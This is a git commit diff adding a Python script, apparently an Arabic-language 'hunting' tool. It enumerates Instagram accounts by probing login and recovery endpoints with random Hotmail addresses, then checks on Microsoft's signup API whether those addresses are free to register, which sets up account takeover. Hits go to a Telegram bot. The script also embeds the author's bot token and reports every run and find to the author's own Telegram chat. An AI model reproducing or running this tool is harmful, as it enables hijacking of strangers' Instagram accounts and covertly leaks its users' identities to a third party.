7bc94bf0396efd6d86d5f4d84144945e1462d1a1
zebz0 <160431310+zebz0@users.noreply.github.com>
2024-06-25 12:51:52 +0300

    Update ppooppooposkaj.py

--- ppooppooposkaj.py
+++ ppooppooposkaj.py
@@ -1,1 +1,317 @@
-DEMO
+import requests
+import uuid
+import pazok,time
+import secrets
+import random
+import string
+import json
+import re
+from pazok import *
+import os
+import random
+import requests,pazok
+from threading import Thread
+import string
+try:
+    import pazok
+except:
+    os.system('pip install pazok')
+#====الوان====
+Z = '\033[1;31m'  # أحمر
+X = '\033[1;33m'  # أصفر
+F = '\033[2;32m'  # أخضر
+C = "\033[1;97m"  # أبيض
+B = '\033[2;36m'  # أزرق
+Y = '\033[1;34m'  # أزرق داكن
+W = '\033[0;37m'  # رمادي
+e = "\u001b[38;5;242m" #رمادي داكن
+m = "\u001b[38;5;15m" #ابيض
+E = "\u001b[38;5;8m" #رمادي فاتح
+p = '\x1b[1m'#عريض
+#====الوان====
+logo =f"""\u001b[38;5;15m \x1b[1m
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⠻⣿⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⣼⡿⠉⠀⣀⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⢰⠋⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡝⠛⠉⠉⠉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠜⢻⡿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣽⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣠⡿⠋⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣰⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⢀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡝⠀⠀⠀⠈⠉⠛⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣶⣤⡔⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⠛⣛⣛⣂⣀⣀⣀⠀⣀⣀⣀⣀⣀⣀⡀⣈⣉⣀⣀⣀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⠋⢉⡻⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⠛⢻⣿⡿⠀⠛⣿⡟⠛⢻⣿⡇⠙⣿⡟⠛⢻⣿⡄⣿⣿⠛⣻⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⡄⠈⢿⣷⡹⣿⣿⣿⣿⣿⡃⠀⢀⣴⣿⠏⠀⠀⠀⣿⣷⣶⠀⠀⠀⠀⣿⣷⣶⣾⣿⠁⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣧⠀⠘⣿⣿⣌⢻⣿⣿⡟⠁⣠⣾⣟⣁⣰⣶⠀⠀⣿⡇⠀⢰⣶⡆⠀⣿⣇⠀⣸⣿⠇⣠⣿⣟⣁⣰⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣧⠀⠘⣿⣿⣷⣍⢿⠀⠀⠛⠛⠛⠛⠛⠛⠀⠛⠛⠛⠛⠛⠛⠃⠛⠛⠛⠛⠛⠋⠀⠛⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠲⠀⠀⠻⣿⣿⣷⣜⡻⠿⣿⣿⣿⣿⣶⡦⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠷⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	"""
+print(logo)
+#تم اضافت التوكن لمعرفت من صاد في الاداه و من قام بتشغيلها
+#The token was added to know who used the tool and who ran it 
+tokenzebz = "7042398014:AAELHhBMWZX28y7AJYHcoGK-nyy92YBJwdk"
+idzebz = 6060332252
+token = input(f' Enter the {E}token {m}: ')
+id = input(f' Enter the {E}ID {m}: ')
+rrt = f"""
+تم تشغيل الاداه من قبل
+""" 
+poo=[
+"الشخص",f"tg://openmessage?user_id={id}",
+            ]
+pazok.tele_ms(tokenzebz,idzebz,txt=rrt,buttons=poo)            
+os.system('clear')
+print('انتضر قليلاً..... ')
+Aa = 0
+Bb = 0
+Cc = 0 
+Dd = 0
+
+def check_inst1(email):
+    
+    device_id = "android-" + secrets.token_hex(8)
+    uid = str(uuid.uuid4())
+    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+    headers = {
+        'User-Agent': pazok.agnt_in()
+    }
+    data = {
+        'login_attempt_count': '0',
+        '_csrftoken': 'missing',
+        'from_reg': 'false',
+        'device_id': f'{device_id}',
+        'username': f"{email}",
+        'password': pazok.user_ran(8 * "1"),
+        'uuid': uid
+    }
+
+    try:
+        with requests.session() as sess:
+            req = sess.post(url, headers=headers, data=data).json()
+        test = req.get("error_type", "unknown")
+
+        if test == "bad_password":
+            return True
+        elif test == "invalid_user":
+            return False
+        elif test == "ip_block":
+            return "VPN"
+        else:
+            return "ERROR"
+    except Exception as er:
+        return er
+        
+        
+#2
+def check_inst2(email):
+    
+    device_id = "android-" + secrets.token_hex(8)
+    co=pazok.cook()
+    
+    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+
+    headers = {
+        'User-Agent': pazok.agnt_in(),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-CSRFToken": f'{co.csrftoken}',
+    }
+
+    data = {
+        'username': f'{email}',
+        'password': f'{pazok.user_ran(11*"1")}',
+        'device_id': f'{device_id}',
+        '_csrftoken': f'{co.csrftoken}',
+        'phone_id': f'{str(uuid.uuid4())}',
+        'guid': f'{str(uuid.uuid4())}',
+    }
+
+    try:
+        with requests.session() as sess:
+            req = sess.post(url, headers=headers, data=data).json()
+        test = req.get("error_type")
+        if test == "bad_password":
+            return True
+        elif test == "invalid_user":
+            return False
+        else:
+            return "VPN"
+    except Exception as e:
+        return "ERROR"
+
+
+def check_inst3(email):
+    tm = str(f"{time.time():.3f}")
+    co = pazok.cook()
+    device_id = str("android-" + secrets.token_hex(8))
+    headers = {
+        'X-Pigeon-Session-Id': str(uuid.uuid4()),
+        'X-Pigeon-Rawclienttime': str(tm),
+        'X-IG-Connection-Speed': '-1kbps',
+        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+        'X-IG-Bandwidth-TotalBytes-B': '0',
+        'X-IG-Bandwidth-TotalTime-MS': '0',
+        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+        'X-IG-Connection-Type': 'WIFI',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-App-ID': str(pazok.user_ran(15*"4")),
+        'User-Agent': pazok.agnt_in(),
+        'Accept-Language': 'en-GB, en-US',
+        'Cookie': f'mid={co.mid}; csrftoken={co.csrftoken}',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Host': 'i.instagram.com',
+        'X-FB-HTTP-Engine': 'Liger',
+        'Connection': 'keep-alive',
+        'Content-Length': '356'
+    }
+    data = {
+        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"'+co.csrftoken+'","adid":"'+str(uuid.uuid4())+'","guid":"'+str(uuid.uuid4())+'","device_id":"'+device_id+'","query":"'+email+'"}',
+        'ig_sig_key_version': '4'
+    }
+
+    try:
+        req = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).json()
+        if req.get("email") == email:
+            return True
+        else:
+            return False
+    except Exception as e:
+        error_type = req.get("error_type")
+        if error_type == "user_not_found":
+            return False
+        else:
+            return "ERROR"
+
+
+
+
+
+def instagram(email):
+    result = random.choice([check_inst1, check_inst2,check_inst3])(email)
+    return result
+
+import threading
+lock = threading.Lock()
+
+def xx():
+    global Aa, Bb, Cc, Dd
+    
+    with lock:
+        email = pazok.user_file("username.txt",True) + "@hotmail.com"
+    jj=instagram(email)
+    if jj==True:
+        Aa +=1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"""
+{e}| ☆ {F}Wait and you will hunt {e}☆ |
+{e}•——————————————————•        
+{F}| good instagrm → {Aa} |
+•——————————————————•
+{Z}| Bad instagram → {Bb} |
+•——————————————————•
+{F}| Good Hotmail → {Cc} |
+•——————————————————•
+{Z}| Bad Hotmail → {Dd} |
+•——————————————————•
+    {X}| email → {email} |
+    		""")
+       
+        response = requests.get('https://account.live.com/signup')
+        amsc = response.cookies.get_dict()['amsc']
+        canary = re.search(r'"apiCanary":"(.*?)"', response.text).group(1).encode('utf-8').decode('unicode_escape')
+        
+        
+        url = "https://signup.live.com/API/CheckAvailableSigninNames"
+        headers = {
+            "Canary": canary,
+            "Cookie": f"amsc={amsc}"}
+        data = {
+            "includeSuggestions": True,
+            "signInName": f"{email}"}
+        
+        req = requests.post(url, headers=headers, data=json.dumps(data)).json()
+        wa=req["isAvailable"]
+        
+        if wa == True:
+            Cc +=1
+            print(f"""
+{e}| ☆ {F}Wait and you will hunt {e}☆ |
+{e}•——————————————————•        
+{F}| good instagrm → {Aa} |
+•——————————————————•
+{Z}| Bad instagram → {Bb} |
+•——————————————————•
+{F}| Good Hotmail → {Cc} |
+•——————————————————•
+{Z}| Bad Hotmail → {Dd} |
+•——————————————————•
+    {X}| email → {email} |
+    		""")
+            mgs =f"""
+    		
+Email → {email}    		
+    		"""
+            requests.get('https://api.telegram.org/bot' +str(token) + '/sendMessage?chat_id=' + str(id) + '&text=' + str(mgs))
+            rrtt = f"""
+تم الصيد حساب من الاداه
+""" 
+            pooo=[
+"الشخص",f"tg://openmessage?user_id={id}",
+            ]
+            pazok.tele_ms(tokenzebz,idzebz,txt=rrtt,buttons=pooo)                            
+                
+           
+
+        elif wa == False:
+            Dd +=1
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f"""
+{e}| ☆ {F}Wait and you will hunt {e}☆ |
+{e}•——————————————————•        
+{F}| good instagrm → {Aa} |
+•——————————————————•
+{Z}| Bad instagram → {Bb} |
+•——————————————————•
+{F}| Good Hotmail → {Cc} |
+•——————————————————•
+{Z}| Bad Hotmail → {Dd} |
+•——————————————————•
+    {X}| email → {email} |
+    		""")
+        else:
+            print("Erorr ❌ ")            
+    elif jj==False:
+        Bb +=1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"""
+{e}| ☆ {F}Wait and you will hunt {e}☆ |
+{e}•——————————————————•        
+{F}| good instagrm → {Aa} |
+•——————————————————•
+{Z}| Bad instagram → {Bb} |
+•——————————————————•
+{F}| Good Hotmail → {Cc} |
+•——————————————————•
+{Z}| Bad Hotmail → {Dd} |
+•——————————————————•
+    {X}| email → {email} |
+    		""")
+        
+    #else:print(jj)   
+    
+while True:    
+    pazok.sb(xx,10)            
